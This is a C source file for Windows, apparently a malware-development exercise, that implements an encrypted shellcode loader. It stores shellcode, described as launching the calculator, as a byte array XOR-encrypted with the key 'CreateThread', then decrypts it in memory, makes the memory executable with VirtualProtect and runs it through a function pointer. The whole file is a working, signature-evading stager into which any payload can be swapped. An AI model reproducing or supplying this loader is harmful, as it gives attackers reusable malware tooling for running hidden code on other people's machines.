#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

typedef VOID(WINAPI* fnShellcode)();

// Calculator shellcode encrypted with key "CreateThread"
const unsigned char encrypted[] = { 0xbf, 0x3b, 0xe4, 0x80, 0x88, 0x82, 0x9a, 0x6f, 0x7a, 0x6e, 0x2a, 0x3e, 0x0e, 0x2f, 0x21, 0x21, 0xd2, 0x3e, 0x57, 0xa9, 0xe3, 0x32, 0xfc, 0x29, 0x3b, 0xc3, 0xf4, 0x2e, 0x88, 0xca, 0xf9, 0xd5, 0xb2, 0xce, 0x08, 0xf5, 0x37, 0xdf, 0x84, 0x3f, 0xd6, 0xc4, 0x33, 0xa2, 0x57, 0xda, 0xbe, 0x53, 0xdf, 0x9f, 0xf6, 0xe8, 0xaa, 0xb6, 0xaa, 0xde, 0x6b, 0x57, 0x96, 0xde, 0x7e, 0x6e, 0x41, 0x4d, 0xe6, 0xe7, 0xc7, 0xe3, 0x3d, 0xf8, 0x87, 0x20, 0xc9, 0x87, 0xe7, 0xad, 0x10, 0x39, 0x22, 0x3f, 0xc2, 0xb6, 0xb3, 0xff, 0x12, 0x07, 0xcf, 0xdf, 0x84, 0xbf, 0x7e, 0x93, 0x45, 0x8a, 0xa7, 0x87, 0x28, 0x93, 0xe7, 0x8d, 0xd9, 0x1a, 0x59, 0x99, 0x92, 0x31, 0x02, 0x8e, 0x24, 0xeb, 0x5b, 0x98, 0xe5, 0x00, 0x8b, 0xea, 0x2f, 0x92, 0xe6, 0x1b, 0x17, 0xaa, 0x1e, 0x15, 0xfd, 0xa3, 0xd3, 0x26, 0xca, 0x06, 0x96, 0x16, 0x8b, 0xf4, 0xa7, 0xcc, 0xf4, 0xab, 0xe7, 0x22, 0x8b, 0x2a, 0xb7, 0xb7, 0x58, 0x43, 0xd3, 0xbd, 0x09, 0x2a, 0x8c, 0xbe, 0x81, 0xf2, 0xb3, 0xbb, 0x54, 0x4f, 0x1f, 0x49, 0x15, 0xd6, 0xb7, 0x80, 0x12, 0x82, 0x4f, 0x0a, 0x3b, 0x5a, 0x57, 0x4d, 0x78, 0x4c, 0x5b, 0x4d, 0x63, 0x4e, 0x52, 0x4e, 0xb6, 0x7d, 0x53, 0x9b, 0xc0, 0x3e, 0x4f, 0x71, 0xd1, 0xc2, 0x47, 0x62, 0x5a, 0x69, 0x6f, 0xaf, 0x2a, 0xc3, 0x4d, 0xd0, 0xc5, 0xd1, 0x76, 0x67, 0xb5, 0x3e, 0x33, 0x30, 0x44, 0x36, 0x26, 0x3b, 0x46, 0x72, 0xba, 0xb6, 0x1a, 0x4a, 0x3f, 0x3c, 0x11, 0xf8, 0x03, 0xcc, 0x3d, 0xc1, 0xbc, 0x92, 0x9c, 0xb7, 0x56, 0x62, 0x56, 0x0f, 0x84, 0xf5, 0xcb, 0xef, 0xd2, 0xac, 0xe6, 0x2b, 0xd4, 0x90, 0x40, 0x66, 0x4c, 0x23, 0x60, 0xde, 0xa0, 0xbf, 0x4a, 0x6a, 0xd8, 0x27, 0x67, 0x14, 0x39, 0x01, 0x76, 0x33, 0x26, 0xe2, 0x91, 0x84, 0xba, 0x0f, 0xe1, 0x1e, 0x01, 0x77 };

// XORs all characters inplace against a variable length key
VOID xorEnc(const char* key, const SIZE_T keyLen, char* src, const SIZE_T srcLen)
{
	for (SIZE_T i = 0; i < srcLen; i++)
		src[i] = src[i] ^ (key[i % keyLen] + i);
}

int main()
{
	SIZE_T shellcodeLen = sizeof(encrypted) * sizeof(char);
	PVOID shellcode = VirtualAlloc(NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (shellcode == NULL) {
		printf("VirtualAlloc failed with error: %d\n", GetLastError());
		return 1;
	}
	DWORD oldProt = NULL;

	// Copy code in
	memcpy(shellcode, encrypted, shellcodeLen);
	xorEnc("CreateThread", strlen("CreateThread"), (char*)shellcode, shellcodeLen);

	if (VirtualProtect(
		shellcode, shellcodeLen, PAGE_EXECUTE_READWRITE, &oldProt
	) == NULL) {
		printf("VirtualProtect failed with error: %d\n", GetLastError());
		return 1;
	}

	fnShellcode pCalc = (fnShellcode)shellcode;

	pCalc();
	/*if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)shellcode, NULL, NULL, NULL) == NULL) {
		printf("CreateThread failed with error: %d\n", GetLastError());
		return 1;
	}*/
	return 1;
}
